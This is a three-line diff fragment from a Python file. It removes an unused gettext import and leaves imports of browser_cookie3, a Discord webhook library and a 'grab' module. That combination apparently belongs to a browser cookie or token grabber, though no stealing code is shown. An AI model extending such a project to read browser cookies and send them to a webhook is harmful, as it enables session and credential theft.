@@ -1,4 +1,3 @@
-from gettext import find
 import browser_cookie3
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import grab.defaults
